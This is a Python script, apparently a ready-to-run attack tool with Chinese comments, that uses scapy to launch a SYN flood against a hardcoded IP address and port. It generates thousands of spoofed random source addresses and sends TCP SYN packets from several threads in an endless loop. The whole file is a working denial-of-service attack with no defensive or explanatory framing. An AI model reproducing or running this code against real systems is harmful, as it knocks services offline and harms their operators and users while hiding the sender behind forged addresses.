# -*- coding: utf-8 -*-
import queue
import random
import sys
from scapy.all import TCP, IP, send
import time
import string
import threading


target_host = "121.62.17.29"
target_port = 20065
THREAD = 5


def creat_false_ip():
    """ 生成假ip地址 """
    def random_addr():
        # 随机地址段
        addr = random.randint(1, 254)
        return addr

    false_ip_queue = queue.Queue(maxsize=10000)
    while not false_ip_queue.full():
        ipv4 = f"{random_addr()}.{random_addr()}.{random_addr()}.{random_addr()}"
        false_ip_queue.put(ipv4)

    return false_ip_queue


def syn_flood_attack(false_ip_queue):
    """ syn flood 攻击 """
    while not false_ip_queue.empty():
        src_ip = false_ip_queue.get()
        src_port = int(random.randint(1025, 65535))

        seq = "".join(random.sample(string.digits, 9))
        window = 64

        # 构建包，发包
        packet = IP(src=src_ip, dst=target_host) / TCP(
            sport=src_port, dport=target_port, flags="S", window=window, seq=seq)
        send(packet, verbose=0)

        sys.stdout.write(f'[*] {packet}\n')
        sys.stdout.flush()


def run():
    """ 运行 """
    counts = 1
    while True:
        try:
            false_ip_queue = creat_false_ip()
            for i in range(THREAD):
                t = threading.Thread(target=syn_flood_attack, args=(false_ip_queue, ))
                t.start()

            print(f"\n[!] 第 {counts} 轮结束")
            counts += 1
            time.sleep(10)
        except KeyboardInterrupt:
            print("停止 SYN flood attack.")
            break


if __name__ == '__main__':
    run()
